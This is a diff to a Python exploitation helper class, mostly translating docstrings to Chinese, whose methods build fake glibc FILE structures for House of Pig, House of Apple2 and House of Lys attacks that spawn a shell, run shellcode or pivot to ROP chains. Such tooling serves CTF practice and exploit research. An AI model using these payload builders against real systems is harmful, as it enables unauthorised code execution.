@@ -128,15 +128,15 @@ class IO_FILE_plus_struct(FileStructure):
 
 
     def getshell_from_IO_puts_by_stdout_libc_2_23(self, stdout_store_addr:int, system_addr:int, lock_addr:int):
-        """Exec shell by IO_puts by _IO_2_1_stdout_ in libc-2.23.so
+        """在 libc-2.23.so 中借助 _IO_2_1_stdout_ 通过 IO_puts 执行 shell。
 
         Args:
-            stdout_store_addr (int): The address stored in stdout. Probably is libc.sym['_IO_2_1_stdout_'].
-            system_addr (int): System address.
-            lock_addr (int): Lock address.
+            stdout_store_addr (int): 存储在 stdout 中的地址，通常为 libc.sym['_IO_2_1_stdout_']。
+            system_addr (int): system 地址。
+            lock_addr (int): lock 地址。
 
         Returns:
-            bytes: payload.
+            bytes: payload。
         """
         self.flags = 0x68732f6e69622f
         self._IO_read_ptr = 0x61
@@ -146,16 +146,16 @@ class IO_FILE_plus_struct(FileStructure):
         return self.__bytes__()
 
 
-    # only support amd64
+    # 仅支持 amd64
     def getshell_by_str_jumps_finish_when_exit(self, _IO_str_jumps_addr:int, system_addr:int, bin_sh_addr:int):
-        """Execute system("/bin/sh") through fake IO_FILE struct, and the version of libc should be between 2.24 and 2.29.
+        """通过伪造 IO_FILE 结构执行 system("/bin/sh")，要求 libc 版本在 2.24 到 2.29 之间。
 
-        Usually, you have hijacked _IO_list_all, and will call _IO_flush_all_lockp by exit or other function.
+        通常你已经劫持了 _IO_list_all，并通过 exit 或其他函数调用 _IO_flush_all_lockp。
 
         Args:
-            _IO_str_jumps_addr (int): Addr of _IO_str_jumps
-            system_addr (int): Addr of system
-            bin_sh_addr (int): Addr of the string: /bin/sh
+            _IO_str_jumps_addr (int): _IO_str_jumps 的地址
+            system_addr (int): system 的地址
+            bin_sh_addr (int): 字符串 /bin/sh 的地址
 
         Returns:
             bytes: payload
@@ -173,18 +173,18 @@ class IO_FILE_plus_struct(FileStructure):
 
     def house_of_pig_exec_shellcode(self, fp_heap_addr:int, gadget_addr:int, str_jumps_addr:int, 
                         setcontext_off_addr:int, mprotect_addr:int, shellcode: str or bytes, lock:int=0):
-        """House of pig to exec shellcode with setcontext.
+        """House of pig，借助 setcontext 执行 shellcode。
 
-        You should fill tcache_perthread_struct[0x400] with '__free_hook - 0x1c0' addr.
+        需要将 tcache_perthread_struct[0x400] 填为 '__free_hook - 0x1c0' 地址。
 
         Args:
-            fp_heap_addr (int): The heap addr that replace original _IO_list_all or chain
-            gadget_addr (int): Gadget addr for 'mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]'
-            str_jumps_addr (int): Addr of _IO_str_jumps
-            setcontext_off_addr (int): Addr of setcontext and add offset, which is often 61
-            mprotect_addr (int): Addr of mprotect
-            shellcode ([type]): The shellcode you wanner execute
-            lock (int, optional): lock value if needed. Defaults to 0.
+            fp_heap_addr (int): 用于替换原 _IO_list_all 或 chain 的堆地址
+            gadget_addr (int): 'mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]' 的 gadget 地址
+            str_jumps_addr (int): _IO_str_jumps 的地址
+            setcontext_off_addr (int): setcontext 加偏移后的地址，通常偏移为 61
+            mprotect_addr (int): mprotect 的地址
+            shellcode ([type]): 待执行的 shellcode
+            lock (int, optional): 需要时的 lock 值，默认为 0。
 
         Returns:
             bytes: payload
@@ -216,23 +216,18 @@ class IO_FILE_plus_struct(FileStructure):
         return payload
 
     # house of apple2: https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
-    # suitable for ubuntu 22.04
+    # 适用于 ubuntu 22.04
     def house_of_apple2_execmd_when_exit(self, fake_file_addr: int, _IO_wfile_jumps_addr: int, system_addr: int, cmd: str="sh"):
-        """Construct a self-referencing fake FILE for House of Apple2 (execmd variant).
+        """为 House of Apple2（execmd 变体）构造自引用的伪造 FILE。
 
-        IMPORTANT: fake_file_addr must be the address where this fake FILE struct
-        will actually reside in memory (e.g. a heap chunk you control), NOT the
-        address of a standard stream like _IO_2_1_stdout_. The struct uses
-        self-referencing pointers (_codecvt -> itself, _wide_data -> itself-0x48)
-        that only work when fake_file_addr matches the real location.
+        重要：fake_file_addr 必须是该伪造 FILE 结构在内存中实际驻留的地址（例如你控制的堆块），而不是 _IO_2_1_stdout_ 之类标准流的地址。该结构使用了自引用指针（_codecvt -> 自身，_wide_data -> 自身-0x48），只有当 fake_file_addr 与真实位置一致时才能生效。
 
-        Memory constraints: *(fake_file_addr-0x30) and *(fake_file_addr-0x18)
-        must be 0 (these are checked by _IO_wdoallocbuf). If the fake FILE
-        overwrites a real standard stream in-place, this is naturally satisfied.
+        内存约束：*(fake_file_addr-0x30) 与 *(fake_file_addr-0x18) 必须为 0（这两处会被 _IO_wdoallocbuf 检查）。若该伪造 FILE 就地覆盖某个真实标准流，则自然满足此条件。
         """
         assert context.bits == 64, "only support amd64!"
         assert len(cmd) < 7, "length of cmd must lower than 7"
-        self.flags = unpack("  " + cmd.ljust(6, "\x00"), 64)  # "  sh"
+        cmd_data = ("  " + cmd.ljust(6, "\x00")).encode("latin-1")
+        self.flags = unpack(cmd_data, 64)  # "  sh"
         self._IO_write_base = 0
         self._IO_write_ptr = 1
         self._mode = 0
@@ -246,16 +241,14 @@ class IO_FILE_plus_struct(FileStructure):
     house_of_apple2_execmd_when_do_IO_operation = house_of_apple2_execmd_when_exit
 
     # house of apple2: https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
-    # suitable for ubuntu 22.04
+    # 适用于 ubuntu 22.04
     def house_of_apple2_stack_pivoting_when_exit(self, fake_file_addr: int, _IO_wfile_jumps_addr: int, leave_ret_addr: int, pop_rbp_addr: int, fake_rbp_addr: int):
-        """Construct a self-referencing fake FILE for House of Apple2 (stack pivoting variant).
+        """为 House of Apple2（栈迁移变体）构造自引用的伪造 FILE。
 
-        IMPORTANT: fake_file_addr must be the address where this fake FILE struct
-        will actually reside in memory, NOT a standard stream address.
-        See house_of_apple2_execmd_when_exit for full explanation.
+        重要：fake_file_addr 必须是该伪造 FILE 结构在内存中实际驻留的地址，而不是标准流的地址。
+        完整说明见 house_of_apple2_execmd_when_exit。
 
-        Memory constraints: *(fake_file_addr-0x30) and *(fake_file_addr-0x18)
-        must be 0.
+        内存约束：*(fake_file_addr-0x30) 与 *(fake_file_addr-0x18) 必须为 0。
         """
         assert context.bits == 64, "only support amd64!"
         self.flags = 0
@@ -280,11 +273,11 @@ class IO_FILE_plus_struct(FileStructure):
                                                    fp_heap_addr : int,
                                                    ):
         '''
-        House_of_Lys to getshell:
+        House_of_Lys getshell：
         Args:
-            system_addr: Address of system
-            _IO_obstack_jumps_addr: Address of _IO_obstack_jumps
-            fp_heap_addr: The heap addr that replace original _IO_list_all or chain
+            system_addr: system 的地址
+            _IO_obstack_jumps_addr: _IO_obstack_jumps 的地址
+            fp_heap_addr: 用于替换原 _IO_list_all 或 chain 的堆地址
         '''
         assert context.bits == 64, "only support amd64!"
         self._IO_read_base = 1
@@ -306,19 +299,19 @@ class IO_FILE_plus_struct(FileStructure):
                                                                     magic_gadget_two_addr : int,
                                                                     magic_gadget_three_addr : int):
         '''
-        House_of_Lys to execute ROP chain by stack pivoting:
+        House_of_Lys 通过栈迁移执行 ROP 链：
 
         Args:
-            fp_heap_addr(int): The heap addr that replace original _IO_list_all or chain
-            _IO_obstack_jumps_addr(int): Address of _IO_obstack_jumps
-            rop_payload(bytes or str): The ROP chain you wanner execute
-            magic_gadget_one_addr(int): Address of "mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]"
-            magic_gadget_two_addr(int): Address of "mov rsp, rdx; ret"
-            magic_gadget_three_addr(int): Address of "add rsp, 0x30; mov rax, r12; pop r12; ret"
+            fp_heap_addr(int): 用于替换原 _IO_list_all 或 chain 的堆地址
+            _IO_obstack_jumps_addr(int): _IO_obstack_jumps 的地址
+            rop_payload(bytes or str): 待执行的 ROP 链
+            magic_gadget_one_addr(int): "mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]" 的地址
+            magic_gadget_two_addr(int): "mov rsp, rdx; ret" 的地址
+            magic_gadget_three_addr(int): "add rsp, 0x30; mov rax, r12; pop r12; ret" 的地址
 
-        Notices: 
-            1. The size of fp_heap must be exceeded  0x128+len(rop_payload)! If not, you can use [0xe0:] and payload_replace to set ropchain in other memory
-            2. We can use the following code to find gadgets:
+        注意事项：
+            1. fp_heap 的大小必须超过 0x128+len(rop_payload)！若不满足，可使用 [0xe0:] 与 payload_replace 将 ropchain 设置到其他内存
+            2. 可通过如下代码查找 gadget：
                 libc.search(asm("mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]")).__next__()
                 libc.search(asm("mov rsp, rdx; ret")).__next__()
                 libc.search(asm("add rsp, 0x30; mov rax, r12; pop r12; ret")).__next__()
@@ -338,7 +331,7 @@ class IO_FILE_plus_struct(FileStructure):
             0x0:self.__bytes__() + pack(fp_heap_addr, 64),
             0xe8:{
                 0x0:magic_gadget_three_addr,
-                0x8:rop_chain_addr,    #Maybe sometimes you need to replace this address
+                0x8:rop_chain_addr,    #有时可能需要替换此地址
                 0x20:magic_gadget_two_addr,
                 0x40:rop_payload
             }
@@ -355,19 +348,19 @@ class IO_FILE_plus_struct(FileStructure):
                                                       magic_gadget_three_addr : int,
                                                       ):
         '''
-        House_of_Lys to execute ROP chain by stack pivoting in GLibc 2.36:
+        House_of_Lys 在 GLibc 2.36 下通过栈迁移执行 ROP 链：
 
         Args:
-            fp_heap_addr(int): The heap addr that replace original _IO_list_all or chain
-            _IO_obstack_jumps_addr(int): Address of _IO_obstack_jumps
-            rop_payload(bytes or str): The ROP chain you wanner execute
-            magic_gadget_one_addr(int): Address of "mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]"
-            magic_gadget_two_addr(int): Address of "mov rsp, rdx; ret"
-            magic_gadget_three_addr(int): Address of "add rsp, 0x38 ; mov rax, rcx ; ret"
+            fp_heap_addr(int): 用于替换原 _IO_list_all 或 chain 的堆地址
+            _IO_obstack_jumps_addr(int): _IO_obstack_jumps 的地址
+            rop_payload(bytes or str): 待执行的 ROP 链
+            magic_gadget_one_addr(int): "mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]" 的地址
+            magic_gadget_two_addr(int): "mov rsp, rdx; ret" 的地址
+            magic_gadget_three_addr(int): "add rsp, 0x38 ; mov rax, rcx ; ret" 的地址
 
-        Notices: 
-            1. The size of fp_heap must be exceeded  0x130+len(rop_payload)! If not, you can use [0xe0:] and payload_replace to set ropchain in other memory
-            2. We can use the following code to find gadgets:
+        注意事项：
+            1. fp_heap 的大小必须超过 0x130+len(rop_payload)！若不满足，可使用 [0xe0:] 与 payload_replace 将 ropchain 设置到其他内存
+            2. 可通过如下代码查找 gadget：
                 libc.search(asm("mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]")).__next__()
                 libc.search(asm("mov rsp, rdx; ret")).__next__()
                 libc.search(asm("add rsp, 0x38 ; mov rax, rcx ; ret")).__next__()
@@ -386,7 +379,7 @@ class IO_FILE_plus_struct(FileStructure):
             {
             0x0:self.__bytes__() + pack(fp_heap_addr, 64),
             0xe8:{
-                0x0:rop_chain_addr,    #Maybe sometimes you need to replace this address
+                0x0:rop_chain_addr,    #有时可能需要替换此地址
                 0x8:magic_gadget_three_addr,
                 0x28:magic_gadget_two_addr,
                 0x38:rop_chain_addr + 0x8,
